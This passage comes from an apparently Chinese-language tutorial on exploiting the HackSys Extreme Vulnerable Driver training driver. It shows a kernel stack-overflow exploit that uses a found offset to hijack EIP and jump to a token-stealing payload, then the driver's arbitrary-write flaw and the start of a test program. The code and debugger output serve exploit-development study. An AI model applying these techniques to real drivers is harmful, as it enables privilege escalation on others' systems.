</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>运行之后报错，查看寄存器：</p>
<div class="highlight" id="id-40"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kd&gt; g
</span></span><span class="line"><span class="cl">KDTARGET: Refreshing KD connection
</span></span><span class="line"><span class="cl">Access violation - code c0000005 <span class="o">(</span>!!! second chance !!!<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">73413173</span> ??              ???
</span></span><span class="line"><span class="cl">kd&gt; r
</span></span><span class="line"><span class="cl"><span class="nv">eax</span><span class="o">=</span><span class="m">00000000</span> <span class="nv">ebx</span><span class="o">=</span>97e25988 <span class="nv">ecx</span><span class="o">=</span>0fe2dc3f <span class="nv">edx</span><span class="o">=</span><span class="m">00000000</span> <span class="nv">esi</span><span class="o">=</span>83f0217c <span class="nv">edi</span><span class="o">=</span>97e25918
</span></span><span class="line"><span class="cl"><span class="nv">eip</span><span class="o">=</span><span class="m">73413173</span> <span class="nv">esp</span><span class="o">=</span>af973ac0 <span class="nv">ebp</span><span class="o">=</span><span class="m">41307341</span> <span class="nv">iopl</span><span class="o">=</span><span class="m">0</span>         nv up ei ng nz ac po nc
</span></span><span class="line"><span class="cl"><span class="nv">cs</span><span class="o">=</span><span class="m">0008</span>  <span class="nv">ss</span><span class="o">=</span><span class="m">0010</span>  <span class="nv">ds</span><span class="o">=</span><span class="m">0023</span>  <span class="nv">es</span><span class="o">=</span><span class="m">0023</span>  <span class="nv">fs</span><span class="o">=</span><span class="m">0030</span>  <span class="nv">gs</span><span class="o">=</span><span class="m">0000</span>             <span class="nv">efl</span><span class="o">=</span><span class="m">00010292</span>
</span></span><span class="line"><span class="cl"><span class="m">73413173</span> ??              ???</span></span></code></pre></div><p>eip指向73413173，判断该值的位置：</p>
<div class="highlight" id="id-41"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ ./pattern_offset.rb -q <span class="m">73413173</span> -l <span class="m">1000</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Exact match at offset <span class="m">544</span></span></span></code></pre></div><p>修改代码：</p>
<div class="highlight" id="id-42"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include &lt;iostream&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include &lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">UserBufferSize</span> <span class="o">=</span> <span class="mi">544</span><span class="o">+</span><span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="o">::</span><span class="nf">CreateFileW</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HacksysExtremeVulnerableDriver&#34;</span><span class="p">,</span> <span class="n">GENERIC_ALL</span><span class="p">,</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">nullptr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ERROR]Open Device Error</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[INFO]Device Handle: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hDevice</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">PULONG</span> <span class="n">UserBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="nf">HeapAlloc</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">UserBuffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ERROR]Allocate ERROR&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[INFO]Allocated Memory: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[INFO]Allocation Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">RtlFillMemory</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">MemoryAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">UserBuffer</span> <span class="o">+</span> <span class="n">UserBufferSize</span><span class="p">)</span><span class="o">-</span><span class="k">sizeof</span><span class="p">(</span><span class="n">ULONG</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">   <span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">MemoryAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="mh">0x66666666</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">WriteRet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222007</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">WriteRet</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">UserBuffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>查看寄存器：</p>
<div class="highlight" id="id-43"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kd&gt; r
</span></span><span class="line"><span class="cl"><span class="nv">eax</span><span class="o">=</span><span class="m">00000000</span> <span class="nv">ebx</span><span class="o">=</span>8790dfd8 <span class="nv">ecx</span><span class="o">=</span>076f487e <span class="nv">edx</span><span class="o">=</span><span class="m">00000000</span> <span class="nv">esi</span><span class="o">=</span>83ec817c <span class="nv">edi</span><span class="o">=</span>8790df68
</span></span><span class="line"><span class="cl"><span class="nv">eip</span><span class="o">=</span><span class="m">66666666</span> <span class="nv">esp</span><span class="o">=</span>aed81ac0 <span class="nv">ebp</span><span class="o">=</span><span class="m">41414141</span> <span class="nv">iopl</span><span class="o">=</span><span class="m">0</span>         nv up ei ng nz ac po nc
</span></span><span class="line"><span class="cl"><span class="nv">cs</span><span class="o">=</span><span class="m">0008</span>  <span class="nv">ss</span><span class="o">=</span><span class="m">0010</span>  <span class="nv">ds</span><span class="o">=</span><span class="m">0023</span>  <span class="nv">es</span><span class="o">=</span><span class="m">0023</span>  <span class="nv">fs</span><span class="o">=</span><span class="m">0030</span>  <span class="nv">gs</span><span class="o">=</span><span class="m">0000</span>             <span class="nv">efl</span><span class="o">=</span><span class="m">00010292</span>
</span></span><span class="line"><span class="cl"><span class="m">66666666</span> ??              ???</span></span></code></pre></div><p>可以看到成功控制eip</p>
<ul>
<li>调试判断</li>
</ul>
<p>嘶，，还是有问题啊，应该是0x21C的，但是为啥21C成不了，224可以</p>
<h3 id="构造shellcode" class="heading-element">
  <a href="#%e6%9e%84%e9%80%a0shellcode" class="heading-mark"></a>构造shellcode</h3><p>其他的和上一个一样：</p>
<div class="highlight" id="id-44"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">	<span class="n">ULONG</span> <span class="n">UserBufferSize</span> <span class="o">=</span> <span class="mh">0x224</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="n">FILE_ATTRIBUTE_NORMAL</span> <span class="o">|</span> <span class="n">FILE_FLAG_OVERLAPPED</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ERROR]Open Device Error</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="n">PULONG</span> <span class="n">UserBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="nf">HeapAlloc</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">UserBuffer</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[ERROR]Allocate ERROR&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="nf">system</span><span class="p">(</span><span class="s">&#34;pause&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="nf">RtlFillMemory</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="n">PVOID</span> <span class="n">MemoryAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)(((</span><span class="n">ULONG</span><span class="p">)</span><span class="n">UserBuffer</span> <span class="o">+</span> <span class="n">UserBufferSize</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONG</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)</span><span class="n">MemoryAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="o">&amp;</span><span class="n">TokenStealingPayloadWin7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="n">ULONG</span> <span class="n">WriteRet</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222007</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="n">UserBufferSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">WriteRet</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">UserBuffer</span><span class="p">);</span></span></span></code></pre></div><h2 id="4arbitraryoverwrite-triggerarbitrarywrite" class="heading-element">
  <a href="#4arbitraryoverwrite-triggerarbitrarywrite" class="heading-mark"></a>4.ArbitraryOverwrite-TriggerArbitraryWrite</h2><h3 id="任意地址写原理" class="heading-element">
  <a href="#%e4%bb%bb%e6%84%8f%e5%9c%b0%e5%9d%80%e5%86%99%e5%8e%9f%e7%90%86" class="heading-mark"></a>任意地址写原理</h3><p>在内核态中调用指针时要注意变量所处于的地址是否是可访问的地址，如果不是可访问的地址很可能会导致蓝屏，检查地址参数地址是否可访问一般调用函数<code>ProbeForRead</code>：</p>
<div class="highlight" id="id-45"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">ProbeForRead</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="k">const</span> <span class="k">volatile</span> <span class="n">VOID</span> <span class="o">*</span><span class="n">Address</span><span class="p">,</span><span class="c1">//指定用户模式缓冲区的开头
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">SIZE_T</span>              <span class="n">Length</span><span class="p">,</span><span class="c1">//指定用户模式缓冲区的长度（以字节为单位）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">ULONG</span>               <span class="n">Alignment</span><span class="c1">//指定用户模式缓冲区开头所需的对齐方式（以字节为单位）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">);</span></span></span></code></pre></div><p>利用：</p>
<ul>
<li>前提：假设存在2个没有验证地址的指针，那么就可能存在任意地址写入</li>
<li>利用：对这2个指针一个指向准备被写入的内核地址，一个是指向存在用户层的shellcode，然后某个内核函数中存在call这个地址的指令</li>
</ul>
<p>漏洞函数在：<code>HackSysExtremeVulnerableDriver-3.00\Driver\HEVD\ArbitraryWrite</code></p>
<p><code>*(Where) = *(What)</code>即为任意地址写漏洞</p>
<div class="highlight" id="id-46"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">NTSTATUS</span>
</span></span><span class="line"><span class="cl"><span class="nf">TriggerArbitraryWrite</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">_In_</span> <span class="n">PWRITE_WHAT_WHERE</span> <span class="n">UserWriteWhatWhere</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PULONG_PTR</span> <span class="n">What</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PULONG_PTR</span> <span class="n">Where</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">PAGED_CODE</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kr">__try</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// Verify if the buffer resides in user mode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">ProbeForRead</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">UserWriteWhatWhere</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WRITE_WHAT_WHERE</span><span class="p">),</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span> <span class="nf">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">What</span> <span class="o">=</span> <span class="n">UserWriteWhatWhere</span><span class="o">-&gt;</span><span class="n">What</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">Where</span> <span class="o">=</span> <span class="n">UserWriteWhatWhere</span><span class="o">-&gt;</span><span class="n">Where</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] UserWriteWhatWhere: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UserWriteWhatWhere</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] WRITE_WHAT_WHERE Size: 0x%zX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WRITE_WHAT_WHERE</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] UserWriteWhatWhere-&gt;What: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">What</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] UserWriteWhatWhere-&gt;Where: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Where</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">##ifdef SECURE
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>        <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// Secure Note: This is secure because the developer is properly validating if address
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// pointed by &#39;Where&#39; and &#39;What&#39; value resides in User mode by calling ProbeForRead()/
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// ProbeForWrite() routine before performing the write operation
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nf">ProbeForRead</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">What</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">),</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span> <span class="nf">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ProbeForWrite</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">Where</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">),</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span> <span class="nf">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">Where</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">What</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">##else
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Triggering Arbitrary Write</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// because the developer is writing the value pointed by &#39;What&#39; to memory location
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// pointed by &#39;Where&#39; without properly validating if the values pointed by &#39;Where&#39;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// and &#39;What&#39; resides in User mode
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="o">*</span><span class="p">(</span><span class="n">Where</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">What</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">##endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kr">__except</span> <span class="p">(</span><span class="n">EXCEPTION_EXECUTE_HANDLER</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Status</span> <span class="o">=</span> <span class="nf">GetExceptionCode</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[-] Exception Code: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Status</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p><code>_WRITE_WHAT_WHERE</code>结构：</p>
<div class="highlight" id="id-47"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_WRITE_WHAT_WHERE</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PULONG_PTR</span> <span class="n">What</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PULONG_PTR</span> <span class="n">Where</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">WRITE_WHAT_WHERE</span><span class="p">,</span> <span class="o">*</span><span class="n">PWRITE_WHAT_WHERE</span><span class="p">;</span></span></span></code></pre></div><p>所以先构造一个大小为8的buf，修改what和where指针，实现任意地址写</p>
<p>测试代码：</p>
<div class="highlight" id="id-48"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">##include&lt;stdio.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp">##include&lt;Windows.h&gt;
</span></span></span><span class="line"><span class="cl"><span class="cp"></span> 
</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_WRITE_WHAT_WHERE</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PULONG_PTR</span> <span class="n">What</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">PULONG_PTR</span> <span class="n">Where</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">WRITE_WHAT_WHERE</span><span class="p">,</span> <span class="o">*</span> <span class="n">PWRITE_WHAT_WHERE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">PWRITE_WHAT_WHERE</span> <span class="n">Buffer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Buffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">WRITE_WHAT_WHERE</span><span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">WRITE_WHAT_WHERE</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ZeroMemory</span><span class="p">(</span><span class="n">Buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">WRITE_WHAT_WHERE</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="n">Buffer</span><span class="o">-&gt;</span><span class="n">Where</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="mh">0x41414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Buffer</span><span class="o">-&gt;</span><span class="n">What</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG_PTR</span><span class="p">)</span><span class="mh">0x41414141</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">recvBuf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// 获取句柄
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span> <span class="o">||</span> <span class="n">hDevice</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
